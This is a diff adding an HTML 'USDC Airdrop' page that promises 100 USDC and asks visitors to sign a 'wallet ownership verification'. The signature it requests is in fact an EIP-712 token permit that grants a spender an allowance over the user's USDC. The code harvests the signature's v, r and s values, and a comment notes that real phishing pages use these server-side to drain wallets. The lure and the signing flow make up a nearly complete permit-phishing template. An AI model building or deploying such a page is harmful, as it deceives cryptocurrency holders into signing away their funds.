@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Claim USDC Airdrop</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+  <style>
+    body {
+      background: #0b0c10;
+      color: #fff;
+      font-family: 'Segoe UI', sans-serif;
+      text-align: center;
+      padding-top: 80px;
+    }
+    .container {
+      background: #1f2833;
+      padding: 30px;
+      margin: auto;
+      width: 360px;
+      border-radius: 15px;
+      box-shadow: 0 0 10px #66fcf1;
+    }
+    button {
+      padding: 10px 20px;
+      background-color: #66fcf1;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    h1 {
+      color: #66fcf1;
+    }
+    #status {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #aaa;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🎁 USDC Airdrop</h1>
+    <p>You've been selected for a 100 USDC exclusive airdrop.</p>
+    <p>Please sign to verify wallet ownership.</p>
+    <button onclick="runPermitFlow()">Claim 100 USDC</button>
+    <div id="status">Waiting for wallet...</div>
+  </div>
+
+  <script>
+    const tokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; // USDC mainnet
+    const spender = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";   // Uniswap Router
+
+    const usdcPermitAbi = [
+      {
+        "inputs": [
+          { "internalType": "address", "name": "owner", "type": "address" },
+          { "internalType": "address", "name": "spender", "type": "address" },
+          { "internalType": "uint256", "name": "value", "type": "uint256" },
+          { "internalType": "uint256", "name": "deadline", "type": "uint256" },
+          { "internalType": "uint8", "name": "v", "type": "uint8" },
+          { "internalType": "bytes32", "name": "r", "type": "bytes32" },
+          { "internalType": "bytes32", "name": "s", "type": "bytes32" }
+        ],
+        "name": "permit",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "constant": true,
+        "inputs": [{ "name": "owner", "type": "address" }],
+        "name": "nonces",
+        "outputs": [{ "name": "", "type": "uint256" }],
+        "type": "function"
+      },
+      {
+        "constant": true,
+        "inputs": [],
+        "name": "DOMAIN_SEPARATOR",
+        "outputs": [{ "name": "", "type": "bytes32" }],
+        "type": "function"
+      }
+    ];
+
+    async function runPermitFlow() {
+      if (!window.ethereum) {
+        document.getElementById("status").innerText = "❌ MetaMask not detected!";
+        return;
+      }
+
+      const web3 = new Web3(window.ethereum);
+      await ethereum.request({ method: 'eth_requestAccounts' });
+      const accounts = await web3.eth.getAccounts();
+      const user = accounts[0];
+
+      const value = web3.utils.toBN(100 * 10 ** 6); // 100 USDC
+      const deadline = Math.floor(Date.now() / 1000) + 3600;
+
+      const contract = new web3.eth.Contract(usdcPermitAbi, tokenAddress);
+      const nonce = await contract.methods.nonces(user).call();
+      const chainId = await web3.eth.getChainId();
+
+      const permitData = {
+        types: {
+          EIP712Domain: [
+            { name: "name", type: "string" },
+            { name: "version", type: "string" },
+            { name: "chainId", type: "uint256" },
+            { name: "verifyingContract", type: "address" }
+          ],
+          Permit: [
+            { name: "owner", type: "address" },
+            { name: "spender", type: "address" },
+            { name: "value", type: "uint256" },
+            { name: "nonce", type: "uint256" },
+            { name: "deadline", type: "uint256" }
+          ]
+        },
+        domain: {
+          name: "USD Coin",
+          version: "2",
+          chainId: chainId,
+          verifyingContract: tokenAddress
+        },
+        primaryType: "Permit",
+        message: {
+          owner: user,
+          spender: spender,
+          value: value.toString(),
+          nonce: nonce,
+          deadline: deadline
+        }
+      };
+
+      document.getElementById("status").innerText = "🔐 Please sign the verification...";
+
+      try {
+        const signature = await ethereum.request({
+          method: "eth_signTypedData_v4",
+          params: [user, JSON.stringify(permitData)],
+        });
+
+        const r = "0x" + signature.slice(2, 66);
+        const s = "0x" + signature.slice(66, 130);
+        const v = parseInt(signature.slice(130, 132), 16);
+
+        document.getElementById("status").innerText = "✅ Signed. Processing...";
+
+        // Real phishing pages DO NOT call permit here.
+        // They extract `v`, `r`, `s` and use it server-side to drain later.
+
+      } catch (err) {
+        document.getElementById("status").innerText = `❌ Signature cancelled`;
+      }
+    }
+  </script>
+</body>
+</html>
